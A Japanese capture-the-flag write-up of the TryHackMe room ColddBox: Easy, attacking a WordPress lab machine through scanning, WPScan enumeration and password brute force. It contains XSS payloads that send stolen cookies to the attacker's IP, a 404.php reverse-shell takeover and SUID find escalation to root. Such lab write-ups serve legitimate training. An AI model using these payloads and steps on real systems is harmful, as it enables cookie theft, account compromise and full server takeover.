# ColddBox:Easy CTF

https://tryhackme.com/room/colddboxeasy

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.89.216
root@ip-10-10-59-181:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-11 05:43 GMT
Nmap scan report for 10.10.89.216
Host is up (0.00043s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
4512/tcp open  unknown
MAC Address: 02:C6:7D:90:9C:B1 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 4.19 seconds
root@ip-10-10-59-181:~# sudo nmap -sV -p80,4512 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-11 05:44 GMT
Nmap scan report for 10.10.89.216
Host is up (0.00016s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:C6:7D:90:9C:B1 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.63 seconds
```

SSH が 4512 ポートになっている。

### gobuster

```shell
root@ip-10-10-59-181:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.89.216
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/wp-content           (Status: 301) [Size: 317] [--> http://10.10.89.216/wp-content/]
/wp-login.php         (Status: 200) [Size: 2547]
/license.txt          (Status: 200) [Size: 19930]
/wp-includes          (Status: 301) [Size: 318] [--> http://10.10.89.216/wp-includes/]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.89.216/]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-admin             (Status: 301) [Size: 315] [--> http://10.10.89.216/wp-admin/]
/hidden               (Status: 301) [Size: 313] [--> http://10.10.89.216/hidden/]
/xmlrpc.php           (Status: 200) [Size: 42]
/wp-signup.php        (Status: 302) [Size: 0] [--> /wp-login.php?action=register]
/server-status        (Status: 403) [Size: 277]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

/hidden

```text
U-R-G-E-N-T
C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip
```

ユーザー名：c0ldd, hugo, phillip

WordPress スキャン

```shell
$ wpscan --url http://10.10.89.216 --enumerate
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]N
[+] URL: http://10.10.89.216/ [10.10.89.216]
[+] Started: Tue Mar 11 01:58:18 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.89.216/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.89.216/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.89.216/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.89.216/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.10.89.216/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.89.216/wp-content/themes/twentyfifteen/
 | Last Updated: 2024-11-12T00:00:00.000Z
 | Readme: http://10.10.89.216/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.9
 | Style URL: http://10.10.89.216/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.89.216/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:34 <====================================> (652 / 652) 100.00% Time: 00:00:34
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:02:15 <==================================> (2575 / 2575) 100.00% Time: 00:02:15

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:07 <=====================================> (137 / 137) 100.00% Time: 00:00:07

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:04 <===========================================> (75 / 75) 100.00% Time: 00:00:04

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:06 <================================> (100 / 100) 100.00% Time: 00:00:06

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <======================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Mar 11 02:01:45 2025
[+] Requests Done: 3599
[+] Cached Requests: 10
[+] Data Sent: 977.644 KB
[+] Data Received: 762.365 KB
[+] Memory used: 309.75 MB
[+] Elapsed time: 00:03:26
```

ここでも 3 ユーザー検出されている。

## XSS

ブログのコメント投稿機能に HTML タグが使えると明示していて怪しいので、XSS でクッキーを盗むことを目指す。

```shell
<b>nice!</b><script>fetch('http://10.2.22.182:8000?cookie=' + btoa(document.cookie) );</script>
```

こういう表示になった。

```text
Your comment is awaiting moderation.

nice!fetch(‘http://10.2.22.182:8000?cookie=’ + btoa(document.cookie) );
```

次のように書いても同じ。

```shell
<b>nice!2</b><ScRiPT>fetch('http://10.2.22.182:8000?cookie=' + btoa(document.cookie) );</ScRiPT>
```

明示されているタグ以外は削除される気がする。

```text
You may use these HTML tags and attributes: <a href="" title=""> <abbr title=""> <acronym title=""> <b> <blockquote cite=""> <cite> <code> <del datetime=""> <em> <i> <q cite=""> <strike> <strong>
```

```shell
<a href="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cDovLzEwLjIuMjIuMTgyOjgwMDA/Y29va2llPScgKyBidG9hKGRvY3VtZW50LmNvb2tpZSkgKTs8L3NjcmlwdD4=">wondeful!</a>
```

「data:」が除去される。

何重にしても除去される。一旦あきらめて別の道を探す。

```shell
bbe<a href="ddadadata:ta:ta:ata:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cDovLzEwLjIuMjIuMTgyOjgwMDA/Y29va2llPScgKyBidG9hKGRvY3VtZW50LmNvb2tpZSkgKTs8L3NjcmlwdD4=">wondeful!2</a>
```

## ブルートフォース

他にアイデアが無いので、wpscan で検出されるユーザーに対してブルートフォース。

```shell
$ wpscan --url 10.10.89.216 --passwords /usr/share/wordlists/rockyou.txt

[+] Performing password attack on Wp Login against 4 user/s
[SUCCESS] - c0ldd / 9876543210
^Cying hugo / iceman Time: 00:05:32 <                    > (5359 / 57378788)  0.00%  ETA: ??:??:??
[!] Valid Combinations Found:
 | Username: c0ldd, Password: 9876543210
```

5000 万件中、5000 件ぐらいのところで割れた。

Web にログイン。

## ファイルアップロード

### Media アップロード

シンプルに shell.php をアップロードしようとしたらエラーになる。  
マジックナンバー変えたり拡張子変えたり色々試したがうまくいかなかった。

### 404.php

Appearance の Editor から、404.php を編集できる。

https://www.revshells.com/  
で生成した PHP コードに置き換える。

http://10.10.89.216/noexist  
のような形ではだめで、

http://10.10.89.216/?p=100  
のように存在しないポストを参照する。

```shell
$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.89.216] 59532
Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 09:18:54 up  2:37,  0 users,  load average: 0.00, 0.00, 0.73
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

リバースシェル取得成功

## 権限昇格１

```shell
$ ls -al /home
total 12
drwxr-xr-x  3 root  root  4096 Sep 24  2020 .
drwxr-xr-x 23 root  root  4096 Sep 24  2020 ..
drwxr-xr-x  3 c0ldd c0ldd 4096 Oct 19  2020 c0ldd
$ ls -al /home/c0ldd
total 24
drwxr-xr-x 3 c0ldd c0ldd 4096 Oct 19  2020 .
drwxr-xr-x 3 root  root  4096 Sep 24  2020 ..
-rw------- 1 c0ldd c0ldd    0 Oct 19  2020 .bash_history
-rw-r--r-- 1 c0ldd c0ldd  220 Sep 24  2020 .bash_logout
-rw-r--r-- 1 c0ldd c0ldd    0 Oct 14  2020 .bashrc
drwx------ 2 c0ldd c0ldd 4096 Sep 24  2020 .cache
-rw-r--r-- 1 c0ldd c0ldd  655 Sep 24  2020 .profile
-rw-r--r-- 1 c0ldd c0ldd    0 Sep 24  2020 .sudo_as_admin_successful
-rw-rw---- 1 c0ldd c0ldd   53 Sep 24  2020 user.txt
```

c0ldd に昇格する必要がある。

とりあえず安定化。

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

```shell
www-data@ColddBox-Easy:/$ find / -perm -u=s -type f -ls 2>/dev/null
find / -perm -u=s -type f -ls 2>/dev/null
   259674     40 -rwsr-xr-x   1 root     root        40128 Mar 26  2019 /bin/su
   259658     44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /bin/ping6
   259657     44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /bin/ping
   271762     32 -rwsr-xr-x   1 root     root        30800 Jul 12  2016 /bin/fusermount
   259691     28 -rwsr-xr-x   1 root     root        27608 Jan 27  2020 /bin/umount
   259647     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /bin/mount
      266     40 -rwsr-xr-x   1 root     root        40432 Mar 26  2019 /usr/bin/chsh
      322     76 -rwsr-xr-x   1 root     root        75304 Mar 26  2019 /usr/bin/gpasswd
    23747     24 -rwsr-xr-x   1 root     root        23376 Mar 27  2019 /usr/bin/pkexec
      313    220 -rwsr-xr-x   1 root     root       221768 Feb  8  2016 /usr/bin/find
      471    136 -rwsr-xr-x   1 root     root       136808 Jan 31  2020 /usr/bin/sudo
    21705     36 -rwsr-xr-x   1 root     root        32944 Mar 26  2019 /usr/bin/newgidmap
      381     40 -rwsr-xr-x   1 root     root        39904 Mar 26  2019 /usr/bin/newgrp
    23202     52 -rwsr-sr-x   1 daemon   daemon      51464 Jan 14  2016 /usr/bin/at
    21706     36 -rwsr-xr-x   1 root     root        32944 Mar 26  2019 /usr/bin/newuidmap
      264     72 -rwsr-xr-x   1 root     root        71824 Mar 26  2019 /usr/bin/chfn
      391     56 -rwsr-xr-x   1 root     root        54256 Mar 26  2019 /usr/bin/passwd
    22793    420 -rwsr-xr-x   1 root     root       428240 May 27  2020 /usr/lib/openssh/ssh-keysign
    23819    112 -rwsr-xr-x   1 root     root       110792 Jul 10  2020 /usr/lib/snapd/snap-confine
   145199     84 -rwsr-xr-x   1 root     root        84120 Apr  9  2019 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
      568     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   147595     16 -rwsr-xr-x   1 root     root        14864 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   271341     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

find に SUID が付いている。

```shell
www-data@ColddBox-Easy:/$ find . -exec /bin/sh -p \; -quit
find . -exec /bin/sh -p \; -quit
# whoami
whoami
root
```

いきなり root になれた。

```shell
# cat /home/c0ldd/user.txt
cat /home/c0ldd/user.txt
............
```

```shell
# cat /root/root.txt
cat /root/root.txt
.............
```

ルートフラグゲット。

## 振り返り

- ブルートフォースは見極めが難しい。全体 5000 万件で、1 分間で 1500 件とかしか進まないので。
- CTF 的にはそれを示唆してほしいが、それどころか、c0ldd が hugo のパスワードを変更したという設定なので、c0ldd が脆弱なパスワード使ってるとは普通は考えないと思う。
- 次からは、WordPress にログインしたら、メディアップロードではなく 404.php を編集できないか真っ先に確認する。
